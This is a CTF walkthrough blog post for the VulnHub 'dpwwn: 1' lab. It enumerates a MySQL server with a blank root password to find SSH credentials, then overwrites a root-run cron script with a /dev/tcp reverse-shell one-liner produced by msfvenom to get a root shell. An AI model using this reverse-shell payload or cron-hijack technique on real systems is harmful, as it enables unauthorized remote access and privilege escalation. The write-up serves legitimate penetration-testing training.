<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">dpwwn: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/dpwwn-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-15T10:01:49+00:00">August 15, 2019</time><time class="updated" datetime="2025-06-10T20:11:22+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to take another CTF challenge down. The credit for making this VM machine goes to “Debashish Pal” and it is a boot2root challenge where we have to root the machine and capture the flag to complete the challenge. You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/dpwwn-1,342/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
<ol>
<li><span style="color: #000000;"><strong>Scanning</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<ol start="2">
<li><span style="color: #000000;"><strong>Enumeration</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Mysql </span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">SSH</span></li>
<li><span style="color: #000000;">Msfvenom</span></li>
<li><span style="color: #000000;">Netcat</span></li>
</ul>
<ol start="4">
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;">Writable Script running on crontab</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough:</span></h3>
<p><span style="color: #000000;"><strong>Scanning:</strong></span></p>
<p><span style="color: #000000;">Let’s start of by scanning the network and identifying the host IP address. We can see our host IP is 192.168.1.101 by using Netdiscover.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/--qQ1IdrGGaY/XVUrTHk2DbI/AAAAAAAAgBs/ayJbaxeULpk-udsMmJ1lrzJDT6rRJHC8wCLcBGAs/s1600/1.png"/></strong></span></p>
<p><span style="color: #000000;">Then, as usual, we used our favourite tool Nmap for port enumeration. We found that port 22, 80 and 3306 are open.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-dqVIZT8FP10/XVUrTPuWaFI/AAAAAAAAgBo/HmFhAOqBxUA9ifjtuR5UXOJyQ3JZxHTMQCLcBGAs/s1600/2.1.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Enumeration:</strong></span></h3>
<p><span style="color: #000000;">As we can see mysql service is running (3306) we tried our luck to access the mysql server with root user and blank password and to our surprise, we were able to login.</span></p>
<p><span style="color: #000000;">Once we logged in, we got the database names, there we saw a database of ssh, we checked for its tables and found one user credentials <strong>mistic:testP@$$swordmistic</strong></span></p>
<pre class="lang:default decode:true ">mysql –h 192.168.1.101 –u root –p
show databases;
use ssh;
show tables;
select * from users;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d7B1msTuXTo/XVUrTSfWpBI/AAAAAAAAgBw/FpOGJLBkQWQF8B5Z92pScsYPKD9n7_lVQCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploitation</span>:</strong></span></h3>
<p><span style="color: #000000;">We were able to ssh the target system using the above-found credentials. After logging in we found a file named <strong>logrot.sh</strong>. We looked inside the file and this is bash script which collects the logs.</span></p>
<p><span style="color: #000000;">And in the crontab, the same file is scheduled for execution with root privileges.</span></p>
<pre class="lang:default decode:true">ssh mistic@192.168.1.101
ls –la
cat logrot.sh
cat /etc/crontab</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QjebkcFMwto/XVUrUrlkXHI/AAAAAAAAgB0/tLqmLkomA8kZYvGx76tk4GgoT5fNYdWAACLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So what we did is we created a reverse netcat payload using msfvenom with listener ip as our kali and listener port 1234.</span></p>
<pre class="lang:default decode:true">msfvenom –p cmd/unix/reverse_bash lhost=192.168.1.106 lport=1234 R</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-SH-ZSJyqEfA/XVUrUs4YwhI/AAAAAAAAgB4/LDkdWJUQq4M4Lnq4u6E-jBgNLP9lyFvJwCLcBGAs/s1600/4.png"/></strong></span></p>
<p><span style="color: #000000;">Then we copied the same payload inside the <strong>logrot.sh </strong>binary using the <strong>echo </strong>command.</span></p>
<pre class="lang:default decode:true">echo ‘0&lt;&amp;74-;exec 74&lt;&gt;/dev/tcp/192.168.1.106/1234;sh &lt;&amp;74 &gt;&amp;74 2&gt;&amp;74’ &gt; logrot.sh</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-UygL3kE4-xQ/XVUrU7bjljI/AAAAAAAAgB8/thBAwJeWzRQhDLo1byQBxcZqdKhfkbp1QCLcBGAs/s1600/5.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
<p><span style="color: #000000;">Since the <strong>logrot.sh </strong>is scheduled in crontab with root privileges, we simultaneously started netcat listener on our kali machine and waited for the reverse shell. And after some time we got a <strong>root </strong>shell and eventually the root <strong>flag.</strong></span></p>
<pre class="lang:default decode:true">nc –lvp 1234
cd /root
ls
cat dpwwn-01—FLAG.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3ThQdQuxpzQ/XVUrV4GD0UI/AAAAAAAAgCA/Qys1sBpGRfoX2DMbtkZtyr_6sG3z0srxwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Auqib Wani is a Certified Ethical Hacker, Penetration Tester and a Tech Enthusiast with more than 5 years of experience in the field of Network &amp; Cyber Security. Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/auqib-wani-14210a71/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
